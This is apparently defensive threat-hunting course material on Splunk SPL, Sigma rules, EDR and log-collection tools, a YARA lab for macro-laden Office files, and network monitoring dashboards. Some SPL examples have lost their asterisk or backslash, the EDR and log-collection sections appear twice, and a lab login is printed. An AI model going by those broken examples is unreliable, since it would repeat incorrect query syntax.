When an indexer processes an event, it tries to identify the data structure of the event. An event’s data structure describes the different fields in an event. The data structure contains information that a Splunk indexer uses to parse the event into those different fields. The sourcetype default field for the event stores the name of the data structure parsing that event.

﻿

All events of a specific sourcetype have similar fields within them. For example, events with a sourcetype of WinEventLog:Security are from security-related Windows events, which contain fields such as ComputerName and EventCode. Knowing the different sourcetypes available within a Splunk deployment enables analysts to quickly narrow down the scope of their search when searching across an individual sourcetype.

﻿

Processing Data ﻿

The next three terms refer to tools for processing data:

Lookups

Macros

Splunk Apps

Lookups ﻿

Lookups are tables that store field-value combinations. Analysts can write SPL to find data based on the information in a lookup and modify the lookup based on the results of the search. There are four types of lookups:

Comma-Separated Value (CSV) lookups: Tables of static data.

External lookups: Tables with Python scripts or binaries that pull data from an external source to enrich fields in search results.

Key-Value (KV) store lookups: Tables that match fields in an event to fields in a key-value pair collection to output corresponding fields from the collection to the event.

Geospatial lookups: Tables that match location coordinates in events to geographic feature collections to output fields to events, such as country, state, or county names.

An upcoming section of this lesson dives deeper into how to use Splunk SPL.

﻿

Macros ﻿

A macro is a reusable SPL code. Macros are similar to the functions in programming and can range from very complicated to very simple. Macros allow for modularity when writing SPL code, which improves code reusability.

﻿

For example, a detection engineer uses a macro containing the SPL query action=allowed across multiple searches in Splunk. The engineer is notified that alerts do not work on certain vendor logs. This is due to the vendor logs using the SPL action=accepted instead of action=allowed. Since the engineer uses macros in the code, the engineer is able to update the macro to include an “or” statement to also look for action=accepted. This is more efficient than going through each and every SPL query the engineer had previously made and updating them manually.

﻿

Splunk Applications ﻿

Splunk applications extend Splunk functionality. Applications are installed from Splunkbase. The options range from vendor-specific applications that assist with standard parsing to applications that contain dashboards and reports for threat hunting. The exercises in this lab leverage some popular applications for working with Splunk data.

﻿Sending Logs to Splunk Logs are sent to Splunk through forwarders. The most common forwarder is the universal forwarder. The universal forwarder can be installed on both Linux and Windows. It has the following key configuration files:

inputs.conf controls how the forwarder collects data. outputs.conf controls how the forwarder sends data to an indexer or other forwarder. server.conf configures connection and performance tuning. deploymentclient.conf configures deployment server connection. ﻿

While real-time logging is ideal, there are times when it is misconfigured or not set up. In these situations, it is extremely valuable to know how to import and parse a log export to be able to hunt on it. This can be done using a forwarder or using the Splunk front-end upload feature. One caveat for the upload feature is that file types .evt and .evtx do not upload correctly if they are exported from a different machine because they contain information that is specific to the machine that generates those logs.

﻿

NOTE: This lesson uses the configuration files inputs.conf and output.conf in an upcoming exercise. Use the links provided in the Additional Resources section of this task to review the Splunk documentation for these files.

﻿

Parsing ﻿

Raw log parsing occurs on the Splunk indexer. Splunk handles most raw logs by default. However, for special cases, the configuration file props.conf is on an indexer that is used to set up custom file parsing and field extractions. Field extractions are used to assign data from a log to a field to make it searchable. An upcoming lab in this lesson covers configuring field extractions from the Splunk front end.

﻿What does Splunk use to make specific values from a log file searchable? Field Extractions

Hunting with Splunk SPL SPL Review ﻿

SPL is used in Splunk the way the Kibana Query Language (KQL) is used in Elastic Stack. Using SPL syntax enables efficient searches across datasets. Inefficient searches may cause resource issues on the Splunk index that processes the search. This section introduces the following topics that help run efficient searches in Splunk using SPL:

Wildcards

Escape characters

Transforming searches

Common commands

Query optimization

Search mode selection

Wildcards ﻿

Wildcards allow searching for data that starts with, ends with, or contains a certain value. Wildcards, represented by an asterisk character (), can be inserted into string search terms to indicate this type of search in a specific location in the string. For example, the search host="cda” matches against all host values that have “cda” as their first three letters. Examples of host values that successfully match this wildcard query include the following:

cda-win-hunt

cda-acct-1

cdathis-is-not-a-real-machine-name-but-would-be-matched-anyway

This matches because the wildcard can represent an infinite amount of characters.

cda

This matches because the wildcard can also represent zero additional characters after the preceding string.

Although wildcards are useful, they are also inherently more resource-expensive than searching for a specific value. If wildcards are unavoidable, place them at the end of a search value, if possible. For example, searching host="cda*” is more efficient than searching host="*hunt”. Neither of these is as efficient as a more precise search such as host="cda-win-hunt".

﻿

Escape Characters ﻿

The Splunk search head accepts special characters that serve specific functions in a query. When the search head identifies a special character in the query, rather than treating the character as a literal part of the query string, it interprets it as instructions for how to handle the query. For example, the equal sign (=) is a special character in Splunk. Instead of the search head reading it as an equal sign, it identifies it as a special character that separates field names from the value in the query. The type of action the search head performs depends on the special characters the search head encounters in the query.

﻿

The backslash character is a special character within the Splunk query language. The backslash character is known as an escape character. The parser reads any special character as a literal character if an escape character immediately precedes it. This makes it possible to include special characters in a search term without compromising the intent of a query through special functions. For example, a field being searched may include a quotation mark, which is another special character. Adding a backslash before the quotation mark, as in the query field=value_"to_find, forces the parser to ignore the special function of the query and read the literal quotation mark.

﻿

To force Splunk to interpret a backslash literally, an additional backslash must be added. The first backslash escapes the second, preventing it from being treated as a special character.

﻿

Transforming Searches ﻿

Transforming searches are where the real power of Splunk lies. A transforming search answers the following extremely specific questions:

What accounts have logged into more than one machine?

What accounts log in most often across the network?

Over which hours does login activity in the network usually occur?

The first step in using a transforming search is to use a raw event search to retrieve events. Then, use the pipe (|) to pass the events into one or more search commands. A search command transforms events and other data into a new format. Multiple search commands can be chained together by separating them with additional pipe characters. In chained commands, the output from one search command becomes the input for the next search command in the chain.

﻿

Common Search Commands ﻿

Splunk has many different search commands built into it. Some of the most common search commands and their functions include the following in Table 2.2-1, below:

The Splunk Command Types page, listed in the Additional Resource section of this task, provides more information about the usage of these and other commands. Selecting the name of a command provides a complete description and examples of the full usage of that command.

﻿

Query Optimization ﻿

The exact manner in which queries are crafted heavily determines their efficiency. The following three guidelines help improve query efficiency, as explained further, below:

Search on default fields when possible

Avoid negative logic

Use distributable commands before non-distributable commands

﻿

Search on default fields when possible﻿

﻿

Default fields are included within a Splunk event regardless of the other data in the event. Examples of default fields are index, source, and sourcetype. Splunk is able to process default fields quicker than other fields, so using them to narrow the number of events down is a great way to speed up queries.

﻿

Avoid negative logic﻿

﻿

Splunk inherently processes negative logic more slowly than positive logic. Examples of negative logic include the operator != in a field search and the Boolean operator NOT. When possible, avoid using negative logic in queries.

﻿

Use distributable commands before non-distributable commands﻿

﻿

Distributable commands are commands that the search head distributes to Splunk indexers during job processing. Non-distributable commands (such as stats) must always be processed at the search head. This means that the first non-distributable command encountered in a query forces the rest of the search to be processed by the search head. Even if the later parts of the search use distributable commands, the search head never sends a search back to the indexers. Below are two example queries that use the stats command. Although both queries count the number of 4688 process creation events per host, the second query is much more efficient.

﻿

Query 1

host="cda*" | stats count by host, EventCode | where EventCode=4688 ﻿

Query 2

host="cda*" | where EventCode=4688 | stats count by host, EventCode ﻿

The Splunk documentation provides more information about the different types of commands available. The Splunk Command Types reference document also provides a list of commands broken out by type.

﻿

Search Mode Selection ﻿

Another simple way to improve search efficiency is to use the Splunk search mode selector drop-down, under the search magnifying glass. As displayed in Figure 2.2-4, this drop-down offers three search modes: Fast, Smart, and Verbose. Splunk uses Smart mode by default.

﻿Aggregate Using Stats Hunting through large data sets can feel like trying to find a needle in a haystack. Using a command like stats increases the efficiency of a hunt. The command stats is a very useful SPL command in search log aggregation because it helps sift through large datasets. Below, use stats to comb through large data sets to find malicious activity. ﻿

Run the following search to return the dataset auth.log that was imported in the previous lab:
source="auth.log" host="hr-data" sourcetype="linux_secure" ﻿

Search this dataset for threats by appending the following commands to the search, as displayed in Figure 2.2-5, below:
| eval ENV=if(isnull(ENV),"na",ENV) | stats count by host, real_user, process, USER, ENV, COMMAND

This command breaks down the dataset from over 700 entries to 20 entries that are easier to review. It also evaluates the ENV field, filling it in with the string na if it is found to be null. The results, as displayed below in Figure 2.2-6, shows that the user jimmy attempted several privilege escalation methods.

Using the command stats greatly increases the efficiency of hunting through large datasets. This lab provides a simple example of how to use it. Explore the Splunk documentation listed in the Additional Resource section of this task to learn more about ways the command stats helps organize large datasets.

﻿Operationalizing Hunt Searches Running SPL queries to hunt for data is only the first step of utilizing Splunk for threat hunting. Once a search has been created it must be operationalized. Creating dashboards, reports, and alerts makes SPL queries much more efficient to use regularly for hunts. While dashboards, reports, and alerts can be manually created based on hunts, there are numerous Splunk applications that have sets of pre-loaded dashboards, reports, and alerts to save time for analysts. This task describes each of these options in greater detail.

﻿

Dashboards ﻿

A dashboard is a custom page created within a Splunk instance that contains individual panels. Each panel can be a saved visualization, search, or report. A properly made and maintained dashboard provides quick insights into potentially interesting activity within an environment. This helps with identifying suspicious activity.

﻿

Reports ﻿

A report is the easiest way to operationalize a query. In its most basic form, a report is a saved search that is accessible to many analysts.

﻿

Alerts ﻿

An alert is a combination of a saved search, a trigger, and an alert action. When the saved search meets the trigger conditions, the alert action responds in a predetermined fashion. For example, the alert may send an email notification or activate a webhook. Analysts may create alerts that are either scheduled to run on intervals or set up to respond in real-time. Creating and maintaining a set of real-time alerts further stretches Splunk’s capabilities and allows it to perform as a SIEM solution.

﻿

Splunk Applications ﻿

An example of a useful application for threat hunting is an app called ThreatHunting by Olaf Hartong. The application provides several dashboards and over 120 reports built for threat hunting using Sysmon logs. ThreatHunting uses the MITRE ATT&CK® framework to map most of the searches. More information about the dashboard is available in the resources section, below.

﻿

Another application is the Sysmon App for Splunk by Michael Haag, also known as the “Sysmon Splunk app.” This lesson explores this app in an upcoming lab.

﻿

Using reports, alerts, and dashboards enables CPTs to quickly implement real-time monitoring and alerting in environments where other options may not be available. CPTs use Splunk to quickly operationalize intelligence reports, hunting results, and proposed detection rules in a fully automated fashion.

Use Sysmon App for Splunk Haag’s Sysmon App for Splunk is one of many apps that provide pre-built resources for threat hunting. Use the Sysmon App for Splunk to explore how powerful a dashboard can be as a tool in the threat hunting arsenal.

Select the time drop-down that currently displays 24 hours and change it to All time.
﻿

Select the green submit button.
﻿

NOTE: The time range needs to be updated each time a new dashboard is opened in this app. This lab uses All time since the lab has limited logs. Use All time sparingly in a live production Splunk environment as it is taxing on resources.

﻿

Explore the rest of the dashboards in the Sysmon App for Splunk and consider what other dashboards can be created to aid in threat hunting.
﻿

Edit dashboards by selecting Edit in the top right corner of the page.
﻿

View the source by selecting Source on the top left side of the screen, to see how the dashboards are built, as displayed below in Figure 2.2-7.

Modify the panel Events Count by User to count by User and Computer.

﻿

With the Sysmon Overview Source page open, press ctrl+f and search for Events Count by User.
﻿

Under <title>Events Count by User</title> there is a section. Update the query so that the stats command is also grouping by Computer.
﻿

Click the green Save on the top right of the page and make sure all the panes properly load.
﻿

Use the information in this lab to answer the next Knowledge Check.

Using Sigma Rules in Splunk Writing Sigma Rules ﻿

Sigma is a signature format for writing SIEM agnostic queries. Sigma is a generic rule language for log files, just like Snort is for network traffic and Yet Another Recursive Acronym (YARA) is for files. Sigma rules are written in the format YAML Ain't Markup Language (YAML). The Sigma repository includes the tool Sigmac to translate the rules into SIEM-specific query languages. The tool Uncoder.io is also available for Sigma rule translations. It is a web app provided by SOC Prime.

﻿

Figure 2.2-8, below, describes the different elements of the Sigma rule format and their requirements. It is encouraged to fill out as many fields as possible, however, not all of the fields are required. According to the Sigma documentation, the only required fields are title, logsource, detection, and condition.

Translating Sigma Rules ﻿

Sigmac is a command line tool written in Python. Sigmac translates Sigma rules into SIEM-specific query languages. For Sigmac to work, users must set up the configuration file that contains mappings for the target environment. This ensures that items such as index names and field names align with the target environment. An upcoming lab provides an opportunity to explore this tool more closely.

﻿

A useful tool to use with Sigmac is Sigma2SplunkAlert by Patrick Bareiss. This tool converts Sigma rules to SPL and outputs the full Splunk alert configuration.

﻿

Using Uncoder.io ﻿

Uncoder is a web app that allows for easy Sigma translation to a host of SIEM query languages. Since SOC Prime is in the business of selling access to their correlation rule library, they have some free rules to translate by using the drop-down at the top of the Uncoder page, as highlighted in Figure 2.2-9, below. On the left side of the page in the figure is the Simga rule and on the right side is the translation of the rule into an SPL query.

The downside of Uncoder is that there is no way to set up mappings so that the output aligns with the target environment's field mappings. Analysts must complete this manually on the query.

python sigmac -t splunk -c splunk-linux-custom C:\Users\trainee\Desktop\tools\sudo_priv_esc.yml | clip

Endpoint Visibility Techniques Endpoint visibility is primarily achieved in one of two ways:

Log Collection: The logs of significant events on a system are collected by log aggregation software and shipped to a central Security Information and Event Management (SIEM) platform.

Endpoint Detection and Response (EDR): An EDR agent is placed on monitored systems to send back custom data and traces of system activity to the SIEM.

Log Collection Events that occur in endpoint devices or Information Technology (IT) systems are commonly recorded in log files. Operating systems record events using log files. Each operating system uses its own log files. Applications and hardware devices also generate logs.

﻿

In a Windows environment, these logs are located in a subfolder of %SYSTEMROOT%\System32 and end with the extension .evtx. The particular subfolder name may vary by Windows version; examples of such names are \config and \winevt\Logs. The folder contains the following default files:﻿

Application

System

Security

Forwarded Events

Setup

There are also application-specific logs not included in the standard Application log, but rather in another location under the folder Applications and Services Log. Some logs of interest in this category are the Windows PowerShell logs (which, depending on the detail of logging enabled, may include the exact syntax of commands or modules run), Sysmon logs if the System Monitor utility is installed and running as a service, and Task Scheduler logs.

﻿

In Linux distributions, logs are usually stored in the directory /var/log under the folder or file named for the program writing to the log.

﻿

Collecting these logs from a system and sending them to a centralized server for further processing and analysis can be an effective way of monitoring the activity actually occurring on endpoints in a mission partner’s environment. However, the challenge with this method is that systems tend to generate more log information than a security team can process. It is therefore helpful to automate pre-processing of logs to prioritize events of interest or create rule-based alerts to maximize the efficiency of analytical efforts.

﻿

Endpoint Detection & Response (EDR) ﻿

EDR is an endpoint visibility and protection solution that combines real-time monitoring of endpoint data with rules-based response to potential threat activity. It may collect and provide custom telemetry, system metrics, and activity traces that are not normally logged or available from the operating system.

﻿

The capabilities of an EDR platform vary greatly from application to application and even by how the application is implemented and configured. At a minimum, EDR solutions continuously store those system behaviors that pre-configured rules dictate it should collect, but most also employ a blocking mechanism to prevent host compromise as well. Properly implemented EDR tools often offer improved visibility into system activity over simple log collection and aggregation.

﻿

Data sources on which an EDR solution relies include the following:

System logs

Performance monitoring, such as CPU state

File accesses and details

Running processes

Local and external network connections

Domain name requests

Directly and remotely logged-in users

Removable media usage

﻿Endpoint Visibility Tools After determining which endpoint visibility technique or combination of techniques are best suited for a mission partner’s existing architecture, a security team must consider which tool is suited for the needs of the environment and the systems on which it is deployed.

﻿

Log Collection Tools ﻿

Elastic Beats ﻿

Elastic Beats are applications which ship data from the endpoints on which they are installed to a portion of Elastic Stack for processing and delivery to the Elasticsearch data store. They are open and free and designed for a variety of operating systems. They may be configured to send data to Logstash or Elasticsearch, depending on the configuration of the security architecture.

﻿

Winlogbeat ﻿

Winlogbeat is an Elastic Beat specifically designed to operate on Windows systems and utilize the application programming interface (API) to read and ship Windows Event Logs. It may be configured to capture events from any of the default Windows logs, such as Application, Security, and System, or to collect other application- or hardware-specific events, such as logs generated via Sysmon.

﻿

Auditbeat ﻿

Auditbeat is available for both Linux and Windows operating systems. It is used to send audit events to the Elastic Stack, which include user and process activities that the application is configured to monitor. It may be installed with one of several modules which dictate its behavior. The Auditd module is exclusively for Linux hosts and interfaces with the kernel’s auditd service to capture and ship kernel audit events, such as network connections, file access, system calls, and changes to user information. The File Integrity module is used to monitor specific files and folders for changes, with additional metadata and file hashing added to the events shipped to Elastic. The System module is used to detect state changes and significant events regarding logins, uptime, installed packages, running processes, network sockets, and users.

﻿

Filebeat ﻿

Filebeat is a lightweight solution for shipping new lines of logs or files to Elastic. There are dozens of modules that are precisely tailored to collect and parse logs for their respective applications, such as Apache, MongoDB, Office 365, and Zeek, among many others.

﻿

EDR Tools ﻿Endpoint Visibility Tools After determining which endpoint visibility technique or combination of techniques are best suited for a mission partner’s existing architecture, a security team must consider which tool is suited for the needs of the environment and the systems on which it is deployed.

﻿

Log Collection Tools ﻿

Elastic Beats ﻿

Elastic Beats are applications which ship data from the endpoints on which they are installed to a portion of Elastic Stack for processing and delivery to the Elasticsearch data store. They are open and free and designed for a variety of operating systems. They may be configured to send data to Logstash or Elasticsearch, depending on the configuration of the security architecture.

﻿

Winlogbeat ﻿

Winlogbeat is an Elastic Beat specifically designed to operate on Windows systems and utilize the application programming interface (API) to read and ship Windows Event Logs. It may be configured to capture events from any of the default Windows logs, such as Application, Security, and System, or to collect other application- or hardware-specific events, such as logs generated via Sysmon.

﻿

Auditbeat ﻿

Auditbeat is available for both Linux and Windows operating systems. It is used to send audit events to the Elastic Stack, which include user and process activities that the application is configured to monitor. It may be installed with one of several modules which dictate its behavior. The Auditd module is exclusively for Linux hosts and interfaces with the kernel’s auditd service to capture and ship kernel audit events, such as network connections, file access, system calls, and changes to user information. The File Integrity module is used to monitor specific files and folders for changes, with additional metadata and file hashing added to the events shipped to Elastic. The System module is used to detect state changes and significant events regarding logins, uptime, installed packages, running processes, network sockets, and users.

﻿

Filebeat ﻿

Filebeat is a lightweight solution for shipping new lines of logs or files to Elastic. There are dozens of modules that are precisely tailored to collect and parse logs for their respective applications, such as Apache, MongoDB, Office 365, and Zeek, among many others.

﻿

EDR Tools ﻿

Examples of EDR tools that may be deployed in mission partner environments are Wazuh, Elastic Endpoint Security Agent, and Carbon Black.

﻿

Wazuh ﻿

Wazuh is an updated version of the Operating System Security (OSSEC) endpoint agent. The agent is designed to deliver data relevant to threat detection, security monitoring, and incident response. The principal mechanism that determines what data is returned from an agent to the Wazuh manager is Wazuh rules, many of which are combined in the configuration to form an agent’s Ruleset. Rules are constructed to filter all system activity through regular expressions to extract fields and values of interest. By default, Wazuh provides a robust ruleset for initial installation. Any events that pass the rule filters are sent to the Wazuh manager as alerts via JavaScript Object Notation (JSON).

﻿

Elastic Endpoint Security Agent ﻿

The Elastic Endpoint Security Agent that is integrated into the Elastic Stack is the Elastic Agent, which may be installed with the Endpoint Security integration. This EDR solution was formerly known as Endgame. In its current form, Endpoint Security provides kernel-level data visibility and antivirus protection to the endpoint on which it is installed. It also integrates osquery for inspection of host health and state. Osquery is a tool that gathers data about operating system performance in a central database for easy querying.

﻿

Carbon Black ﻿

VMware’s endpoint solution is Carbon Black. In addition to collection and centralization of important logs and system data, Carbon Black also makes several key tools available to the network defender. It provides secure shell access into a system with the agent installed, which allows a defender to access an affected system to quickly pull files, kill processes, or dump memory to stop or triage an attack in progress. It also contains some automation that seeks to identify the root cause of an attack, which adds efficiency to the analytical burden during incident response.

﻿

A table comparing the EDR tools and capabilities is displayed below:

﻿

﻿

Table 2.3-1

﻿

Other EDR tools include the following:

Symantec Endpoint Protection

Crowdstrike Falcon

FireEye Endpoint Security

Trend Micro XDR

Microsoft Defender for Endpoint

Cortex XDR

Examples of EDR tools that may be deployed in mission partner environments are Wazuh, Elastic Endpoint Security Agent, and Carbon Black.

﻿

Wazuh ﻿

Wazuh is an updated version of the Operating System Security (OSSEC) endpoint agent. The agent is designed to deliver data relevant to threat detection, security monitoring, and incident response. The principal mechanism that determines what data is returned from an agent to the Wazuh manager is Wazuh rules, many of which are combined in the configuration to form an agent’s Ruleset. Rules are constructed to filter all system activity through regular expressions to extract fields and values of interest. By default, Wazuh provides a robust ruleset for initial installation. Any events that pass the rule filters are sent to the Wazuh manager as alerts via JavaScript Object Notation (JSON).

﻿

Elastic Endpoint Security Agent ﻿

The Elastic Endpoint Security Agent that is integrated into the Elastic Stack is the Elastic Agent, which may be installed with the Endpoint Security integration. This EDR solution was formerly known as Endgame. In its current form, Endpoint Security provides kernel-level data visibility and antivirus protection to the endpoint on which it is installed. It also integrates osquery for inspection of host health and state. Osquery is a tool that gathers data about operating system performance in a central database for easy querying.

﻿

Carbon Black ﻿

VMware’s endpoint solution is Carbon Black. In addition to collection and centralization of important logs and system data, Carbon Black also makes several key tools available to the network defender. It provides secure shell access into a system with the agent installed, which allows a defender to access an affected system to quickly pull files, kill processes, or dump memory to stop or triage an attack in progress. It also contains some automation that seeks to identify the root cause of an attack, which adds efficiency to the analytical burden during incident response.

﻿

A table comparing the EDR tools and capabilities is displayed below:

Other EDR tools include the following:

Symantec Endpoint Protection

Crowdstrike Falcon

FireEye Endpoint Security

Trend Micro XDR

Microsoft Defender for Endpoint

Cortex XDR

YARA Rules for Endpoint Hunting Another powerful tool for hunting for malicious traces on endpoints is the use of YARA rules for identifying malicious files. YARA (which means YARA: Yet Another Recursive/Ridiculous Acronym) is a pattern-matching tool and standard used by malware researchers to represent fluidly the many malicious files introduced into modern environments every day.

﻿

Each rule requires three sections: a meta section, a strings section, and a condition section.

﻿

Meta ﻿

The meta values are arbitrary key-value pairs that provide enough information to describe the rule, its context, and for what types of files it should be used. Author information and when the rule was created or published are helpful for those who may follow up about rule updates or currency of the signatures contained in it.

﻿

Strings ﻿

The strings section contains hexadecimal or American Standard Code for Information Interchange (ASCII) values to represent data in a file that may identify it as malicious. These strings are referred to with variable names that take the following form:

$name = "value" ﻿

For hexadecimal data, the string variable takes the following form, in which braces enclose the hexadecimal values:

$name = { 01 23 45 67 89 0A BC DE } ﻿

The challenge with choosing good strings for malware rules is to make the strings specific enough to reasonably indicate a file for further inspection, but not so specific as to be no more useful than a file hash.

﻿

Condition ﻿

The condition value is a Boolean expression that refers to strings using their variable names. The Boolean operations and and or are used to create the condition by which a file is identified as malicious using a given rule.

﻿

The following conditions are also valid:

any of them: matches if any one string is present. all of them: matches only when all strings are present. 3 of them: matches if any three strings (but at least three) are present. ﻿

Example rule:

rule silent_banker : banker { meta: description = "This is just an example" threat_level = 3 in_the_wild = true strings: $a = {6A 40 68 00 30 00 00 6A 14 8D 91} $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9} $c = "UVODFRYSIHLNWPEJXQZAKCBGMT" condition: $a or $b or $c } ﻿

In this rule, if one or more of the specified strings exist in a file, the file matches this YARA rule and is identified by the YARA tool.

﻿

Writing YARA rules for Endpoint Hunting ﻿

Using an understanding of how and why to create and use YARA rules, create a YARA rule to hunt for malicious Microsoft Office documents and use the rule to find such a document on a mission partner’s workstation. Threat Intelligence indicates that this type of malware delivery is being actively employed against the environment in phishing attempts to gain continued access to additional workstations.

﻿

Log in to the VM eng-wkstn-1 with the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Create the file rule.yar on the desktop using Notepad++
﻿

Enter the following lines which initiate the rule declaration:
rule Contains_VBA_macro_code { ﻿

Enter the following lines to fill in meta information:
meta: author = "yournamehere" description = "Detect a MS Office document with embedded VBA macro code" date = "YYYY-MM-DD" filetype = "Office documents" ﻿

Enter the following lines to add strings that are unique to Microsoft Office file types:
strings: $officemagic = { D0 CF 11 E0 A1 B1 1A E1 } $zipmagic = "PK" ﻿

The initial hexadecimal bytes of a file’s binary data are known as the “magic” bytes. The two lines above declare the magic bytes for legacy Microsoft Office documents and for zip files, which is how modern Office documents, such as those with the extensions .docx and .xlsx, are actually packaged.

﻿

Enter the following lines to add strings that indicate Visual Basic for Applications (VBA) code in a legacy Office document:

 $offstr1 = "_VBA_PROJECT_CUR" wide
 $offstr2 = "VBAProject"
 $offstr3 = { 41 74 74 72 69 62 75 74 00 65 20 56 42 5F }
﻿

Enter the following lines to add strings that indicate Visual Basic code in a zip file:

 $xmlstr1 = "vbaProject.bin"
 $xmlstr2 = "vbaData.xml"
﻿

Enter the following lines to create the condition by which a file matches this rule:

condition: ($officemagic at 0 and any of ($offstr*)) or ($zipmagic at 0 and any of ($xmlstr*)) } ﻿

This condition essentially matches the magic bytes of the Office file types and any of the strings which indicate VBA code for that respective file type.

﻿

Open a PowerShell terminal as Administrator.
﻿

Run the following command to use the YARA rule to inspect all files in the trainee user’s folders. This command uses the -rn switch to list all files which do NOT match the YARA rule. While there is no guarantee that those files are safe, they do not contain VBA code.
& "C:\Program Files\yara\yara64.exe" -rn C:\Users\trainee\Desktop\rule.yar C:\Users\trainee\Documents
﻿

Run the following command to use the YARA rule to inspect all files in the trainee user’s folders again, this time searching for files that match the rule by using the -r switch:
& "C:\Program Files\yara\yara64.exe" -r C:\Users\trainee\Desktop\rule.yar C:\Users\trainee\Documents\

Network Visibility Host Versus Network Analysts ﻿

Analysts use different tools and approaches to track host and network activity. This is why it is sensible to have both host and network analysts on the same defense team. Although the roles may be different, each type of analyst benefits from some level of collaboration and understanding of what the other does. It is important for host analysts to understand the capabilities of network analysts and work closely with them. Collaboration includes tipping activity from host or network events to fellow analysts to identify relevant activity. Additionally, host network logs are limited in what they provide host analysts.

﻿

To build a more complete picture of network activity, analysts must use sensors to capture and categorize activity across the network. This activity is available in the pre-built dashboards in Security Onion, as well as tools such as Arkime, both of which are described below.

﻿

Security Onion Dashboards ﻿

Security Onion is one tool that provides hosts analysts a more complete picture of the network. Security Onion has built-in dashboards that help analysts perform network visibility tasks during a hunt. There are also other dashboards for network data sources, such as Zeek and Suricata, that can all be used for viewing network logs and activity. Security Onion parses the logs from each host and presents them in different style dashboards that can have different filters applied to view the logs. The information that these tools provide can often be used to further an investigation by providing evidence for a hunt. Security Onion has dashboards from the following tools:

Sysmon

Zeek

Snort and Suricata

Sysmon Network ﻿

Sysmon is a Windows system service that analysts install on systems to monitor and log system activity to the Windows event log. Sysmon provides detailed information about process creations, network connections, and changes to file creation time. Sysmon identifies malicious or anomalous activity on the network to help analysts understand how the malware operates in an environment. Sysmon is often paired with other Windows tools such as Winlogbeat. Winlogbeat allows analysts to capture event data from any host event logs, such as Sysmon network logs, then send the data to configured aggregators such as Elasticsearch.

﻿

Sysmon event Identifier (ID) 3 is related to network connection events and logs any Transport Control Protocol (TCP)/User Datagram Protocol (UDP) connections on the machine. Each connection is linked to a process through the ProcessID and Process Globally Unique Identifier (ProcessGUID) fields. Event ID 3 also contains the source and destination hostnames, Internet Protocol (IP) addresses, port numbers, and whether or not Internet Protocol version 6 (IPv6) is being used.

﻿

Security Onion provides a dashboard that filters to only display data related to Sysmon event ID 3. This dashboard displays the source IP address, source port, destination IP address, and destination port of any network connection made within the network. This set of information is useful as a quick overview of network connections, allowing analysts to more easily investigate anything that seems out of the ordinary.

﻿

For example, defenders on a hunt may search this dashboard with a specific timeframe, so that it displays all network connection data. A Cyber Protection Team (CPT) going into a hunt needs to be aware of the range of IP addresses that the network being investigated is using for its internal network. This information provides analysts the ability to spot any IP addresses that are out of the known, "in-use" range of addresses and use them during a hunt. Any IP addresses that are out of the known range warrants further investigation, which may lead to potential evidence to use during the hunt. In Figure 2.4-1, below, the IP address starting with 128 stands out because it is in the public range of IP addresses, unlike the rest of the addresses in the column Destination IP.

﻿

﻿

Figure 2.4-1﻿

﻿

Zeek ﻿

Zeek is used for analyzing network traffic and detecting anomalies on a network. Zeek converts data about network traffic into events and uses a script to translate what those events mean to the security of the network. The metadata that Zeek produces includes connection records, the volume of packets that are sent and received, information about TCP sessions, and other useful data that analysts can use during a hunt.

﻿

Zeek also has its own programming language, similar to Python, that allows Zeek the ability to have custom network analysis for any environment. Zeek has capabilities such as extracting files from Hypertext Transport Protocol (HTTP) sessions for analysis or detecting malware by interfacing with external registries.

﻿

Similar to Sysmon, Security Onion contains multiple pre-existing dashboards for Zeek that include data such as file names, file sizes, and the source and destination IP addresses of the hosts transferring files. The Zeek dashboard also provides HTTP header information such as the UserAgent, HTTP method, virtual host, and Uniform Resource Identifier (URI).

﻿

An analyst can use the IP address that was discovered to be in the public range from the previous example to filter out any traffic that had that IP address as the destination. With Zeek, the analyst may also discover any files sent to or from the suspicious host and investigate them as part of the hunt. Using multiple different dashboards and tools during a hunt allows analysts to view data from different angles and pull more data than what one tool offers.

﻿

Snort and Suricata ﻿

Snort is an open-source Intrusion Prevention System (IPS) that uses a collection of rules to help detect and define malicious activity on a network. Snort detects many different attack methods such as denial of service, buffer overflow, stealth port scans, and distributed denial of service. Snort also finds packets that match the rules so it can alert users. Analysts can configure these rules by changing the variable settings located in the file module.d/snort.yml or by using the command line to override the settings. Each fileset has its own variable settings that analysts can configure to change the behavior of Snort. Snort uses the default configuration when variable settings are not specified.

﻿

Suricata is very similar to Snort and is also an open-source software that has a network threat detection engine that provides IPS and network security monitor capabilities. Suricata has a dynamic protocol protection capability that is port-agnostic. This allows Suricata to identify some of the more common application layer protocols such as HTTP, Domain Name System (DNS), and Transport Layer Security (TLS), when they are communicating over non-standard ports.

﻿

Similar to the other tools, Security Onion has built-in dashboards to view alerts from Snort and Suricata. This dashboard contains information such as a list of the rules, source IP address, destination IP address, and destination port. The dashboard also breaks down the rules by severity, category, and rule ID. Additional filtering options are also available. For example, if an analyst wants to only see data under "high" severity rules, they can implement a filter for it. This filter presents the traffic that the rules pick up, which would be related to any high severity events. Suricata also allows analysts to filter out events based on the rule category, such as "Potentially Bad Traffic,” to further filter out traffic during a hunt.

﻿

Arkime ﻿

Arkime, formerly known as Moloch, is another tool that can capture the same data as Security Onion. Arkime is a large-scale packet capture and search system that analysts can use to index network traffic in PCAP format. Arkime also provides an index of network sessions. Arkime uses a simple web interface system for PCAP browsing, searching, and exporting. This tool also exports all packets in standard PCAP format. Analysts can also use ingesting tools, such as Wireshark, during PCAP analysis.

﻿

Arkime allows analysts to create custom rules that specify actions for Arkime to perform when certain criteria or fields are met. The rule files are in the format Yet Another Markup Language (YAML) and are specified in the file config.ini using the setting rulesFiles=. Analysts can have multiple files, using a semicolon-separated list, and include multiple rules in each file. Each rule must have certain values met in order to properly run.

﻿Detection Engineering Situations may also exist in which analysts do not have access to a full Security Information and Event Manager (SIEM), such as Splunk or Security Onion, to aid in the hunt. In these instances, other tools may be easily deployed to quickly parse collected logs or analyze network traffic captures. This section introduces Jupyter Notebooks and Suricata rulesets and how to use them to streamline a hunt.﻿

﻿

Jupyter Notebooks ﻿

Project Jupyter is an open-source project that creates interactive computing across many different languages. Project Jupyter is most known for Jupyter Notebooks, a software suite for creating interactive web pages for organizing code and documentation.

﻿

Jupyter Notebooks provides access to notebooks through a web interface that allows users to save input and output of interactive sessions as well as any important notes. With Jupyter, analysts can create and share documents that contain live code, equations, visualizations, and text. Jupyter supports over 40 programming languages, although it was originally built for Python.

﻿

